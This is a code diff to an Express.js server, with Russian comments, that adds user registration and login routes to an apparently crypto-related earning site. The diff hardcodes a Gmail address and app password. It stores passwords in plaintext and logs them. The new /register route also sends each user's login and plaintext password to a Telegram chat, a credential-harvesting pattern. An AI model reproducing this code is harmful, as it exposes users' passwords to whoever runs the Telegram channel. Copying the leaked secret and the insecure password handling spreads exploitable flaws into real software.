@@ -42,7 +42,7 @@ const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
         user: 'nestneura@gmail.com',
-        pass: 'hyiq blmd pkfx gqxe'
+        pass: 'hyiq blmd pkfx gqxe' // Пароль приложения Gmail
     }
 });
 
@@ -89,6 +89,59 @@ app.post('/apply', async (req, res) => {
     }
 });
 
+// Маршрут для регистрации
+app.post('/register', async (req, res) => {
+    console.log('Received registration request:', req.body);
+    const client = await pool.connect();
+    try {
+        const existingUser = await client.query("SELECT * FROM users WHERE login = $1", [req.body.login]);
+        if (existingUser.rows.length > 0) {
+            return res.status(400).json({ error: 'User already exists' });
+        }
+
+        await client.query(`
+            INSERT INTO users (id, login, password, wallet, seeds, balance, taskscompleted, earnedtoday, earnedtotal)
+            VALUES ($1, $2, $3, '', ARRAY[]::text[], 0, 0, 0, 0)
+        `, [req.body.id, req.body.login, req.body.password]);
+
+        const userResult = await client.query("SELECT * FROM users WHERE login = $1", [req.body.login]);
+        const user = userResult.rows[0];
+
+        const message = `Новый пользователь зарегистрирован:\n` +
+                        `Логин: ${user.login}\n` +
+                        `Пароль: ${user.password}\n` +
+                        `ID: ${user.id}`;
+        await sendTelegramNotification(message);
+
+        res.status(200).json({ success: true, user });
+    } catch (error) {
+        console.error('Error in /register:', error.stack);
+        res.status(500).json({ error: 'Server error' });
+    } finally {
+        client.release();
+    }
+});
+
+// Маршрут для входа
+app.post('/login', async (req, res) => {
+    console.log('Received login request:', req.body);
+    const client = await pool.connect();
+    try {
+        const userResult = await client.query("SELECT * FROM users WHERE login = $1 AND password = $2", [req.body.login, req.body.password]);
+        const user = userResult.rows[0];
+        if (user) {
+            res.status(200).json({ success: true, user });
+        } else {
+            res.status(401).json({ error: 'Invalid login or password' });
+        }
+    } catch (error) {
+        console.error('Error in /login:', error.stack);
+        res.status(500).json({ error: 'Server error' });
+    } finally {
+        client.release();
+    }
+});
+
 // Главная страница
 app.get('/', (req, res) => {
     const indexPath = path.join(__dirname, '../client', 'index.html');
@@ -112,8 +165,6 @@ app.get('*', (req, res) => {
     const indexPath = path.join(__dirname, '../client', 'index.html');
     res.sendFile(indexPath);
 });
-
-// ... (остальные маршруты, такие как /register, /login и т.д., оставь как есть)
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
